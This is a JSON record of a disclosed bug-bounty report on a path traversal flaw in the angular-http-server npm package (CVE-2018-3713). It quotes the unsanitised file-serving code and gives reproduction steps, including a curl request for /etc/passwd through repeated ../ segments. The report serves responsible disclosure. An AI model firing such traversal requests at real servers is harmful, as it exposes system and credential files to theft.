{
  "id": 309120,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDkxMjA=",
  "url": "https://hackerone.com/reports/309120",
  "title": "[angular-http-server] Path Traversal in angular-http-server.js allows to read arbitrary file from the remote server",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2018-01-25T19:45:34.645Z",
  "submitted_at": "2018-01-25T19:45:34.645Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bl4de",
    "url": "/bl4de",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2018-3713"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-03-01T22:14:10.111Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2018-01-30T22:14:02.226Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi Guys,\n\n**angular-http-server** (https://www.npmjs.com/package/angular-http-server) contains Path Traversal vulnerability, which allows malicious user to read content of any file with known path.\n\n**Module:** \n\nA very simple application server designed for Single Page App (SPA) developers.\n(https://www.npmjs.com/package/angular-http-server)\n\n\n**Description**\n\nangular-http-server does not sanitize path in the correct way, so ```curl``` can be used to retrieve content of any file from the remote server.\n\nVulnerable code in ```angular-http-server.js``` file (lines 66-82):\n\n```javascript\nfs.stat(possibleFilename, function(err, stats) {\n        var fileBuffer;\n        if (!err && stats.isFile()) {\n            fileBuffer = fs.readFileSync(possibleFilename);\n            let ct = mime.lookup(possibleFilename);\n            console.log(`Sending ${possibleFilename} with Content-Type ${ct}`);\n            res.writeHead(200, { 'Content-Type': ct });\n\n        } else {\n            console.log(\"Route %s, replacing with index.html\", possibleFilename);\n            fileBuffer = returnDistFile();\n            res.writeHead(200, { 'Content-Type': 'text/html' });\n        }\n\n        res.write(fileBuffer);\n        res.end();\n    });\n```\n\nFile with ```possibleFilename``` name is read and send with guessed mime type. No path or allowed mime type validation is implemented - if it's possible to read the file, code just does it.\n\n\n## Steps To Reproduce:\n\n- install ```angular-http-server```\n\n```\n$ npm install angular-http-server\n```\n\n- create static ```index.html``` file (required as starting point of an app:\n\n```html\n<html>\n\n<head>\n    <meta charset=\"utf8\">\n    <title>Index HTML</title>\n</head>\n\n<body>\n    <div>\n        <p>This is index.html :)</p>\n    </div>\n</body>\n\n</html>\n```\n\n- run server in the same folder where ```index.html``` was created:\n\n```\n$ angular-http-server --path ./\n```\n\n- open the browser and go to ```127.0.0.1:8080``` You should see HTML output.\n\n- from the terminal, execute folloiwng command (please adjust numbers of ../ to your system):\n\n```\n$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/passwd\n```\n\nYou should see the content of ```/etc/passwd``` file:\n\n{F257351}\n\nAlso, in the ```angular-http-server``` log there is information about mime type of the file (```application/octet-stream```):\n\n```\n$ ./node_modules/angular-http-server/angular-http-server.js --path ./\nPath specified: ./\nUsing index.html\nListening on 8080\nSending ../../../../../etc/passwd with Content-Type application/octet-stream\n\n```\n\n\n\n## Supporting Material/References:\n\nConfiguration I've used to find this vulnerability:\n\n- macOS HighSierra 10.13.3\n- node 8.9.3\n- npm 5.5.1\n- curl 7.54.0\n\n## Wrap up\n\nI hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.\n\nThank you\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nThis vulnerability allows malicious user to read content of any file on the machine where angular-http-server is running.\n\nThis might expose vectors to attack system with Remote Code Execution, reveals files with usernames and passwords and many other possibilites.",
  "weakness": {
    "id": 19,
    "name": "Path Traversal"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 257351,
      "file_name": "1.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/257/351/ec2b7172584f64a4ebc3eea0ccb39684ee58c957/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ35IKKUL2%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T184712Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDPkFyAhy%2FpwvxFGMkM3%2F2bfb4n33W0e0f6eNh6RFPxUAiBJKeVcAQroJr2NPLOUyKnrRtE0QNLMpPoL2gT1cHJVUyqxBQgYEAMaDDAxMzYxOTI3NDg0OSIMDOBDc5rfeh0zWELFKo4Frfuu96CtJha2RRUhmEzUwgKzveSjuOztVUIyA3t13W8roNmV5RK4LpR4nRJxw3cHf8NBKQ016l3BOkKLaWtytXCjT1O9ff26AZ%2BEBvos7DsBIHd%2B0bfOurnPTsXcOxYN0p%2BIFtUWr2Qxyp9EXKtVsDfS5lfXMnWf08HXYBDo6F9yYoTqPPqUCzwzAF7BIesRpMynrJA%2F41DgIlKDbNDe0eSDzcwccNERtUxmH48GBHqjftJEQA6ZQq%2FmUv30NG4hURERB0x39j8pbBPwnsKc%2FQdShwJjAtr%2FqGK%2FOD8LmwG3q3L2JqThXWRH3fQbGmqh2qu%2BSFHG8SOzc0RY%2BVUhwxTsunqNQglSfx3eL9RqhjtPlcLcsVr7o6uuWd%2B34io8BwmN%2FV3BBspHY8%2FcasLtYoO%2BV1s369aQANsCx0V6NV3mDyfpD46MZsORh9kHVSARURBnJMT5N4f%2BnIHiINkoIJ2lLZOpGBZY%2BvwYhLGyKvj4uF5xfBodlaNaS%2FbdtQoXqsA5falOeMJvqzqOOUf5PSDgP%2BglkfY5w3aWU9GkpRZshc8pwnWsJ7bvb5vWdjWzW5x0pbX9KZTzEwcAZRRCodU6lExAer7ryOWskkzqBc5HNdHCgDPDEtqXEVXyHt4i7zNkAbBfLa6N7HoiPIR72n%2FQVkGGfdBaHOlqivAc2wqOZWxom1BW3oraNGPmVYiBQsyCYm0SW%2Fel9Zd0fRbu1Hw2JnZTkSIDLSCz6nPN1APC%2BhE9aMUXzCQDTy90Ke0BpZ1jPujr0XiL2qhDxAjT4OE8kEY2t7JpkrgOulrtT8EDUMuHn%2BgMMKLoVDNEHmBV%2BA%2BuFZR6bWbQA0svqGEjjeGPfLNSRLVZDwsoxOdHMM%2BmwMYGOrIBCG0uGM9BVoqemQ27JzW%2FVo6eaFVSlTz6lkBWxsK8lu3vorS%2BOuW4VZW6z4PhK6viKR0WZkNJukTM2W97e8B0FaJv47silQPDUF4zTKrOWIsdZ90mVU%2BnLORYT8q%2Fgge7LSsI7xXC1OatCPBQ7KMEEUZP%2BeovgEF2vsIqtWqRETovSM00AFYj0ZN6bYm2Ynq%2FM4bvQ7%2Bjjbl8DS80O9tizF%2B4fsD%2FB%2FEarE9kkrz%2Bwl8lqw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e44a1765b2ed8bb9853f8315542e9c48162dd59ff86a4dcfb2ae0a823c1b5dc6",
      "file_size": 3270713,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2018-03-01T22:14:02.298Z",
  "allow_singular_disclosure_after": -238537989.71350366,
  "singular_disclosure_allowed": true,
  "vote_count": 7,
  "voters": [
    "muon4",
    "yumi",
    "eveeez",
    "m7mdharoun",
    "khaledibnalwalid",
    "666reda",
    "geotester"
  ],
  "severity": {
    "rating": "high",
    "score": 8.6,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 5629,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "angular-http-server",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
